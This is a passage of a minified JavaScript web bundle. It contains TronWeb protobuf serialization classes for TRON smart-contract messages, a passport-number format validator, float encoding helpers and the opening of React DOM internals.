            TronWebProto.ClearABIContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.ClearABIContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.ClearABIContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getContractAddress_asU8()).length > 0 && t.writeBytes(2, r)
            }
            ,
            TronWebProto.ClearABIContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.ClearABIContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.ClearABIContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.ClearABIContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.ClearABIContract.prototype.getContractAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.ClearABIContract.prototype.getContractAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getContractAddress())
            }
            ,
            TronWebProto.ClearABIContract.prototype.getContractAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getContractAddress())
            }
            ,
            TronWebProto.ClearABIContract.prototype.setContractAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.UpdateSettingContract.prototype.toObject = function(e) {
                return TronWebProto.UpdateSettingContract.toObject(e, this)
            }
            ,
            TronWebProto.UpdateSettingContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    contractAddress: t.getContractAddress_asB64(),
                    consumeUserResourcePercent: n.Message.getFieldWithDefault(t, 3, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.UpdateSettingContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.UpdateSettingContract;
                return TronWebProto.UpdateSettingContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.UpdateSettingContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setContractAddress(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setConsumeUserResourcePercent(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.UpdateSettingContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.UpdateSettingContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.UpdateSettingContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getContractAddress_asU8()).length > 0 && t.writeBytes(2, r),
                0 !== (r = e.getConsumeUserResourcePercent()) && t.writeInt64(3, r)
            }
            ,
            TronWebProto.UpdateSettingContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.UpdateSettingContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.UpdateSettingContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.UpdateSettingContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.UpdateSettingContract.prototype.getContractAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.UpdateSettingContract.prototype.getContractAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getContractAddress())
            }
            ,
            TronWebProto.UpdateSettingContract.prototype.getContractAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getContractAddress())
            }
            ,
            TronWebProto.UpdateSettingContract.prototype.setContractAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.UpdateSettingContract.prototype.getConsumeUserResourcePercent = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.UpdateSettingContract.prototype.setConsumeUserResourcePercent = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.UpdateEnergyLimitContract.prototype.toObject = function(e) {
                return TronWebProto.UpdateEnergyLimitContract.toObject(e, this)
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    contractAddress: t.getContractAddress_asB64(),
                    originEnergyLimit: n.Message.getFieldWithDefault(t, 3, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.UpdateEnergyLimitContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.UpdateEnergyLimitContract;
                return TronWebProto.UpdateEnergyLimitContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setContractAddress(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setOriginEnergyLimit(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.UpdateEnergyLimitContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getContractAddress_asU8()).length > 0 && t.writeBytes(2, r),
                0 !== (r = e.getOriginEnergyLimit()) && t.writeInt64(3, r)
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.prototype.getContractAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.prototype.getContractAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getContractAddress())
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.prototype.getContractAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getContractAddress())
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.prototype.setContractAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.prototype.getOriginEnergyLimit = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.UpdateEnergyLimitContract.prototype.setOriginEnergyLimit = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.SmartContractDataWrapper.prototype.toObject = function(e) {
                return TronWebProto.SmartContractDataWrapper.toObject(e, this)
            }
            ,
            TronWebProto.SmartContractDataWrapper.toObject = function(e, t) {
                var r, n = {
                    smartContract: (r = t.getSmartContract()) && TronWebProto.SmartContract.toObject(e, r),
                    runtimecode: t.getRuntimecode_asB64(),
                    contractState: (r = t.getContractState()) && TronWebProto.ContractState.toObject(e, r)
                };
                return e && (n.$jspbMessageInstance = t),
                n
            }
            ),
            TronWebProto.SmartContractDataWrapper.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.SmartContractDataWrapper;
                return TronWebProto.SmartContractDataWrapper.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.SmartContractDataWrapper.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = new TronWebProto.SmartContract;
                        t.readMessage(r, TronWebProto.SmartContract.deserializeBinaryFromReader),
                        e.setSmartContract(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setRuntimecode(r);
                        break;
                    case 3:
                        r = new TronWebProto.ContractState;
                        t.readMessage(r, TronWebProto.ContractState.deserializeBinaryFromReader),
                        e.setContractState(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.SmartContractDataWrapper.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.SmartContractDataWrapper.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                null != (r = e.getSmartContract()) && t.writeMessage(1, r, TronWebProto.SmartContract.serializeBinaryToWriter),
                (r = e.getRuntimecode_asU8()).length > 0 && t.writeBytes(2, r),
                null != (r = e.getContractState()) && t.writeMessage(3, r, TronWebProto.ContractState.serializeBinaryToWriter)
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.getSmartContract = function() {
                return n.Message.getWrapperField(this, TronWebProto.SmartContract, 1)
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.setSmartContract = function(e) {
                return n.Message.setWrapperField(this, 1, e)
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.clearSmartContract = function() {
                return this.setSmartContract(void 0)
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.hasSmartContract = function() {
                return null != n.Message.getField(this, 1)
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.getRuntimecode = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.getRuntimecode_asB64 = function() {
                return n.Message.bytesAsB64(this.getRuntimecode())
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.getRuntimecode_asU8 = function() {
                return n.Message.bytesAsU8(this.getRuntimecode())
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.setRuntimecode = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.getContractState = function() {
                return n.Message.getWrapperField(this, TronWebProto.ContractState, 3)
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.setContractState = function(e) {
                return n.Message.setWrapperField(this, 3, e)
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.clearContractState = function() {
                return this.setContractState(void 0)
            }
            ,
            TronWebProto.SmartContractDataWrapper.prototype.hasContractState = function() {
                return null != n.Message.getField(this, 3)
            }
            ,
            o.object.extend(t, TronWebProto)
        }
        ,
        6875: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                (0,
                o.default)(e);
                var r = e.replace(/\s/g, "").toUpperCase();
                return t.toUpperCase()in i && i[t].test(r)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = {
                AM: /^[A-Z]{2}\d{7}$/,
                AR: /^[A-Z]{3}\d{6}$/,
                AT: /^[A-Z]\d{7}$/,
                AU: /^[A-Z]\d{7}$/,
                AZ: /^[A-Z]{1}\d{8}$/,
                BE: /^[A-Z]{2}\d{6}$/,
                BG: /^\d{9}$/,
                BR: /^[A-Z]{2}\d{6}$/,
                BY: /^[A-Z]{2}\d{7}$/,
                CA: /^[A-Z]{2}\d{6}$/,
                CH: /^[A-Z]\d{7}$/,
                CN: /^G\d{8}$|^E(?![IO])[A-Z0-9]\d{7}$/,
                CY: /^[A-Z](\d{6}|\d{8})$/,
                CZ: /^\d{8}$/,
                DE: /^[CFGHJKLMNPRTVWXYZ0-9]{9}$/,
                DK: /^\d{9}$/,
                DZ: /^\d{9}$/,
                EE: /^([A-Z]\d{7}|[A-Z]{2}\d{7})$/,
                ES: /^[A-Z0-9]{2}([A-Z0-9]?)\d{6}$/,
                FI: /^[A-Z]{2}\d{7}$/,
                FR: /^\d{2}[A-Z]{2}\d{5}$/,
                GB: /^\d{9}$/,
                GR: /^[A-Z]{2}\d{7}$/,
                HR: /^\d{9}$/,
                HU: /^[A-Z]{2}(\d{6}|\d{7})$/,
                IE: /^[A-Z0-9]{2}\d{7}$/,
                IN: /^[A-Z]{1}-?\d{7}$/,
                ID: /^[A-C]\d{7}$/,
                IR: /^[A-Z]\d{8}$/,
                IS: /^(A)\d{7}$/,
                IT: /^[A-Z0-9]{2}\d{7}$/,
                JM: /^[Aa]\d{7}$/,
                JP: /^[A-Z]{2}\d{7}$/,
                KR: /^[MS]\d{8}$/,
                KZ: /^[a-zA-Z]\d{7}$/,
                LI: /^[a-zA-Z]\d{5}$/,
                LT: /^[A-Z0-9]{8}$/,
                LU: /^[A-Z0-9]{8}$/,
                LV: /^[A-Z0-9]{2}\d{7}$/,
                LY: /^[A-Z0-9]{8}$/,
                MT: /^\d{7}$/,
                MZ: /^([A-Z]{2}\d{7})|(\d{2}[A-Z]{2}\d{5})$/,
                MY: /^[AHK]\d{8}$/,
                MX: /^\d{10,11}$/,
                NL: /^[A-Z]{2}[A-Z0-9]{6}\d$/,
                NZ: /^([Ll]([Aa]|[Dd]|[Ff]|[Hh])|[Ee]([Aa]|[Pp])|[Nn])\d{6}$/,
                PH: /^([A-Z](\d{6}|\d{7}[A-Z]))|([A-Z]{2}(\d{6}|\d{7}))$/,
                PK: /^[A-Z]{2}\d{7}$/,
                PL: /^[A-Z]{2}\d{7}$/,
                PT: /^[A-Z]\d{6}$/,
                RO: /^\d{8,9}$/,
                RU: /^\d{9}$/,
                SE: /^\d{8}$/,
                SL: /^(P)[A-Z]\d{7}$/,
                SK: /^[0-9A-Z]\d{7}$/,
                TH: /^[A-Z]{1,2}\d{6,7}$/,
                TR: /^[A-Z]\d{8}$/,
                UA: /^[A-Z]{2}\d{6}$/,
                US: /^\d{9}$/,
                ZA: /^[TAMD]\d{8}$/
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        6900: (e, t) => {
            t.read = function(e, t, r, n, o) {
                var i, s, a = 8 * o - n - 1, c = (1 << a) - 1, l = c >> 1, u = -7, d = r ? o - 1 : 0, h = r ? -1 : 1, f = e[t + d];
                for (d += h,
                i = f & (1 << -u) - 1,
                f >>= -u,
                u += a; u > 0; i = 256 * i + e[t + d],
                d += h,
                u -= 8)
                    ;
                for (s = i & (1 << -u) - 1,
                i >>= -u,
                u += n; u > 0; s = 256 * s + e[t + d],
                d += h,
                u -= 8)
                    ;
                if (0 === i)
                    i = 1 - l;
                else {
                    if (i === c)
                        return s ? NaN : 1 / 0 * (f ? -1 : 1);
                    s += Math.pow(2, n),
                    i -= l
                }
                return (f ? -1 : 1) * s * Math.pow(2, i - n)
            }
            ,
            t.write = function(e, t, r, n, o, i) {
                var s, a, c, l = 8 * i - o - 1, u = (1 << l) - 1, d = u >> 1, h = 23 === o ? Math.pow(2, -24) - Math.pow(2, -77) : 0, f = n ? 0 : i - 1, p = n ? 1 : -1, g = t < 0 || 0 === t && 1 / t < 0 ? 1 : 0;
                for (t = Math.abs(t),
                isNaN(t) || t === 1 / 0 ? (a = isNaN(t) ? 1 : 0,
                s = u) : (s = Math.floor(Math.log(t) / Math.LN2),
                t * (c = Math.pow(2, -s)) < 1 && (s--,
                c *= 2),
                (t += s + d >= 1 ? h / c : h * Math.pow(2, 1 - d)) * c >= 2 && (s++,
                c /= 2),
                s + d >= u ? (a = 0,
                s = u) : s + d >= 1 ? (a = (t * c - 1) * Math.pow(2, o),
                s += d) : (a = t * Math.pow(2, d - 1) * Math.pow(2, o),
                s = 0)); o >= 8; e[r + f] = 255 & a,
                f += p,
                a /= 256,
                o -= 8)
                    ;
                for (s = s << o | a,
                l += o; l > 0; e[r + f] = 255 & s,
                f += p,
                s /= 256,
                l -= 8)
                    ;
                e[r + f - p] |= 128 * g
            }
        }
        ,
        6907: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : String(new Date);
                (0,
                n.default)(e);
                var r = (0,
                o.default)(t)
                  , i = (0,
                o.default)(e);
                return !!(i && r && i < r)
            }
            ;
            var n = i(r(8804))
              , o = i(r(7961));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        7004: (e, t, r) => {
            "use strict";
            var n = r(8853)
              , o = r(5043)
              , i = r(7950);
            function s(e) {
                var t = "https://react.dev/errors/" + e;
                if (1 < arguments.length) {
                    t += "?args[]=" + encodeURIComponent(arguments[1]);
                    for (var r = 2; r < arguments.length; r++)
                        t += "&args[]=" + encodeURIComponent(arguments[r])
                }
                return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
            }
            function a(e) {
                return !(!e || 1 !== e.nodeType && 9 !== e.nodeType && 11 !== e.nodeType)
            }
            function c(e) {
                var t = e
                  , r = e;
                if (e.alternate)
                    for (; t.return; )
                        t = t.return;
                else {
                    e = t;
                    do {
                        0 !== (4098 & (t = e).flags) && (r = t.return),
                        e = t.return
                    } while (e)
                }
                return 3 === t.tag ? r : null
            }
            function l(e) {
                if (13 === e.tag) {
                    var t = e.memoizedState;
                    if (null === t && (null !== (e = e.alternate) && (t = e.memoizedState)),
                    null !== t)
                        return t.dehydrated
                }
                return null
            }
            function u(e) {
                if (c(e) !== e)
                    throw Error(s(188))
            }
            function d(e) {
                var t = e.tag;
                if (5 === t || 26 === t || 27 === t || 6 === t)
                    return e;
                for (e = e.child; null !== e; ) {
                    if (null !== (t = d(e)))
                        return t;
                    e = e.sibling
                }
                return null
            }
            var h = Object.assign
              , f = Symbol.for("react.element")
              , p = Symbol.for("react.transitional.element")
              , g = Symbol.for("react.portal")
              , y = Symbol.for("react.fragment")
              , m = Symbol.for("react.strict_mode")
              , b = Symbol.for("react.profiler")
              , v = Symbol.for("react.provider")
              , w = Symbol.for("react.consumer")
              , T = Symbol.for("react.context")
              , A = Symbol.for("react.forward_ref")
              , E = Symbol.for("react.suspense")
              , P = Symbol.for("react.suspense_list")
              , C = Symbol.for("react.memo")
              , S = Symbol.for("react.lazy");
            Symbol.for("react.scope");
            var I = Symbol.for("react.activity");
            Symbol.for("react.legacy_hidden"),
            Symbol.for("react.tracing_marker");
            var B = Symbol.for("react.memo_cache_sentinel");
            Symbol.for("react.view_transition");
            var x = Symbol.iterator;
            function O(e) {
                return null === e || "object" !== typeof e ? null : "function" === typeof (e = x && e[x] || e["@@iterator"]) ? e : null
            }
            var _ = Symbol.for("react.client.reference");
            function W(e) {
                if (null == e)
                    return null;
                if ("function" === typeof e)
                    return e.$$typeof === _ ? null : e.displayName || e.name || null;
                if ("string" === typeof e)
                    return e;
                switch (e) {
                case y:
                    return "Fragment";
                case b:
                    return "Profiler";
                case m:
                    return "StrictMode";
                case E:
                    return "Suspense";
                case P:
                    return "SuspenseList";
                case I:
                    return "Activity"
                }
                if ("object" === typeof e)
                    switch (e.$$typeof) {
                    case g:
                        return "Portal";
                    case T:
                        return (e.displayName || "Context") + ".Provider";
                    case w:
                        return (e._context.displayName || "Context") + ".Consumer";
                    case A:
                        var t = e.render;
                        return (e = e.displayName) || (e = "" !== (e = t.displayName || t.name || "") ? "ForwardRef(" + e + ")" : "ForwardRef"),
                        e;
                    case C:
                        return null !== (t = e.displayName || null) ? t : W(e.type) || "Memo";
                    case S:
                        t = e._payload,
                        e = e._init;
                        try {
                            return W(e(t))
                        } catch (r) {}
                    }
                return null
            }
            var R = Array.isArray
              , k = o.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
              , M = i.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
              , N = {
                pending: !1,
                data: null,
                method: null,
                action: null
            }
              , F = []
              , U = -1;
            function D(e) {
                return {
                    current: e
                }
            }
            function L(e) {
                0 > U || (e.current = F[U],
                F[U] = null,
                U--)
            }
            function j(e, t) {
                U++,
                F[U] = e.current,
                e.current = t
            }
            var z = D(null)
              , V = D(null)
              , H = D(null)
              , q = D(null);
            function G(e, t) {
                switch (j(H, t),
                j(V, e),
                j(z, null),
                t.nodeType) {
                case 9:
                case 11:
                    e = (e = t.documentElement) && (e = e.namespaceURI) ? od(e) : 0;
                    break;
                default:
                    if (e = t.tagName,
                    t = t.namespaceURI)
                        e = id(t = od(t), e);
                    else
                        switch (e) {
                        case "svg":
                            e = 1;
                            break;
                        case "math":
                            e = 2;
                            break;
                        default:
                            e = 0
                        }
                }
                L(z),
                j(z, e)
            }
            function $() {
                L(z),
                L(V),
                L(H)
            }
            function K(e) {
                null !== e.memoizedState && j(q, e);
                var t = z.current
                  , r = id(t, e.type);
                t !== r && (j(V, e),
                j(z, r))
            }
            function Z(e) {
                V.current === e && (L(z),
                L(V)),
                q.current === e && (L(q),
                Kd._currentValue = N)
            }
            var Y = Object.prototype.hasOwnProperty
              , J = n.unstable_scheduleCallback
              , X = n.unstable_cancelCallback
              , Q = n.unstable_shouldYield
              , ee = n.unstable_requestPaint
              , te = n.unstable_now
              , re = n.unstable_getCurrentPriorityLevel
              , ne = n.unstable_ImmediatePriority
              , oe = n.unstable_UserBlockingPriority
              , ie = n.unstable_NormalPriority
              , se = n.unstable_LowPriority
              , ae = n.unstable_IdlePriority
              , ce = n.log
              , le = n.unstable_setDisableYieldValue
              , ue = null
              , de = null;
            function he(e) {
                if ("function" === typeof ce && le(e),
                de && "function" === typeof de.setStrictMode)
                    try {
                        de.setStrictMode(ue, e)
                    } catch (t) {}
            }
            var fe = Math.clz32 ? Math.clz32 : function(e) {
                return 0 === (e >>>= 0) ? 32 : 31 - (pe(e) / ge | 0) | 0
            }
              , pe = Math.log
              , ge = Math.LN2;
            var ye = 256
              , me = 4194304;
            function be(e) {
                var t = 42 & e;
                if (0 !== t)
                    return t;
                switch (e & -e) {
                case 1:
                    return 1;
                case 2:
                    return 2;
                case 4:
                    return 4;
                case 8:
                    return 8;
                case 16:
                    return 16;
                case 32:
                    return 32;
                case 64:
                    return 64;
                case 128:
                    return 128;
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                    return 4194048 & e;
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                    return 62914560 & e;
                case 67108864:
                    return 67108864;
                case 134217728:
                    return 134217728;
                case 268435456:
                    return 268435456;
                case 536870912:
                    return 536870912;
                case 1073741824:
                    return 0;
                default:
                    return e
                }
            }
            function ve(e, t, r) {
                var n = e.pendingLanes;
                if (0 === n)
                    return 0;
                var o = 0
                  , i = e.suspendedLanes
                  , s = e.pingedLanes;
                e = e.warmLanes;
                var a = 134217727 & n;
                return 0 !== a ? 0 !== (n = a & ~i) ? o = be(n) : 0 !== (s &= a) ? o = be(s) : r || 0 !== (r = a & ~e) && (o = be(r)) : 0 !== (a = n & ~i) ? o = be(a) : 0 !== s ? o = be(s) : r || 0 !== (r = n & ~e) && (o = be(r)),
                0 === o ? 0 : 0 !== t && t !== o && 0 === (t & i) && ((i = o & -o) >= (r = t & -t) || 32 === i && 0 !== (4194048 & r)) ? t : o
            }
            function we(e, t) {
                return 0 === (e.pendingLanes & ~(e.suspendedLanes & ~e.pingedLanes) & t)
            }
            function Te(e, t) {
                switch (e) {
                case 1:
                case 2:
                case 4:
                case 8:
                case 64:
                    return t + 250;
                case 16:
                case 32:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                    return t + 5e3;
                default:
                    return -1
                }
            }
            function Ae() {
                var e = ye;
                return 0 === (4194048 & (ye <<= 1)) && (ye = 256),
                e
            }
            function Ee() {
                var e = me;
                return 0 === (62914560 & (me <<= 1)) && (me = 4194304),
                e
            }
            function Pe(e) {
                for (var t = [], r = 0; 31 > r; r++)
                    t.push(e);
                return t
            }
            function Ce(e, t) {
                e.pendingLanes |= t,
                268435456 !== t && (e.suspendedLanes = 0,
                e.pingedLanes = 0,
                e.warmLanes = 0)
            }
            function Se(e, t, r) {
                e.pendingLanes |= t,
                e.suspendedLanes &= ~t;
                var n = 31 - fe(t);
                e.entangledLanes |= t,
                e.entanglements[n] = 1073741824 | e.entanglements[n] | 4194090 & r
            }
            function Ie(e, t) {
                var r = e.entangledLanes |= t;
                for (e = e.entanglements; r; ) {
                    var n = 31 - fe(r)
                      , o = 1 << n;
                    o & t | e[n] & t && (e[n] |= t),
                    r &= ~o
                }
            }
            function Be(e) {
                switch (e) {
                case 2:
                    e = 1;
                    break;
                case 8:
                    e = 4;
                    break;
                case 32:
                    e = 16;
                    break;
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                    e = 128;
                    break;
                case 268435456:
                    e = 134217728;
                    break;
                default:
                    e = 0
                }
                return e
            }
            function xe(e) {
                return 2 < (e &= -e) ? 8 < e ? 0 !== (134217727 & e) ? 32 : 268435456 : 8 : 2
            }
            function Oe() {
                var e = M.p;
                return 0 !== e ? e : void 0 === (e = window.event) ? 32 : lh(e.type)
            }
            var _e = Math.random().toString(36).slice(2)
              , We = "__reactFiber$" + _e
              , Re = "__reactProps$" + _e
              , ke = "__reactContainer$" + _e
              , Me = "__reactEvents$" + _e
              , Ne = "__reactListeners$" + _e
              , Fe = "__reactHandles$" + _e
              , Ue = "__reactResources$" + _e
              , De = "__reactMarker$" + _e;
            function Le(e) {
                delete e[We],
                delete e[Re],
                delete e[Me],
                delete e[Ne],
                delete e[Fe]
            }
            function je(e) {
                var t = e[We];
                if (t)
                    return t;
                for (var r = e.parentNode; r; ) {
                    if (t = r[ke] || r[We]) {
                        if (r = t.alternate,
                        null !== t.child || null !== r && null !== r.child)
                            for (e = vd(e); null !== e; ) {
                                if (r = e[We])
                                    return r;
                                e = vd(e)
                            }
                        return t
                    }
                    r = (e = r).parentNode
                }
                return null
            }
            function ze(e) {
                if (e = e[We] || e[ke]) {
                    var t = e.tag;
                    if (5 === t || 6 === t || 13 === t || 26 === t || 27 === t || 3 === t)
                        return e
                }
                return null
            }
            function Ve(e) {
                var t = e.tag;
                if (5 === t || 26 === t || 27 === t || 6 === t)
                    return e.stateNode;
                throw Error(s(33))
            }
            function He(e) {
                var t = e[Ue];
                return t || (t = e[Ue] = {
                    hoistableStyles: new Map,
                    hoistableScripts: new Map
                }),
                t
            }
            function qe(e) {
                e[De] = !0
            }
            var Ge = new Set
              , $e = {};
            function Ke(e, t) {
                Ze(e, t),
                Ze(e + "Capture", t)
            }
            function Ze(e, t) {
                for ($e[e] = t,
                e = 0; e < t.length; e++)
                    Ge.add(t[e])
            }
            var Ye, Je, Xe = RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"), Qe = {}, et = {};
            function tt(e, t, r) {
                if (o = t,
                Y.call(et, o) || !Y.call(Qe, o) && (Xe.test(o) ? et[o] = !0 : (Qe[o] = !0,
                0)))
                    if (null === r)
                        e.removeAttribute(t);
                    else {
                        switch (typeof r) {
                        case "undefined":
                        case "function":
                        case "symbol":
                            return void e.removeAttribute(t);
                        case "boolean":
                            var n = t.toLowerCase().slice(0, 5);
                            if ("data-" !== n && "aria-" !== n)
                                return void e.removeAttribute(t)
                        }
                        e.setAttribute(t, "" + r)
                    }
                var o
            }
            function rt(e, t, r) {
                if (null === r)
                    e.removeAttribute(t);
                else {
                    switch (typeof r) {
                    case "undefined":
                    case "function":
                    case "symbol":
                    case "boolean":
                        return void e.removeAttribute(t)
                    }
                    e.setAttribute(t, "" + r)
                }
            }
            function nt(e, t, r, n) {
                if (null === n)
                    e.removeAttribute(r);
                else {
                    switch (typeof n) {
                    case "undefined":
                    case "function":
                    case "symbol":
                    case "boolean":
                        return void e.removeAttribute(r)
                    }
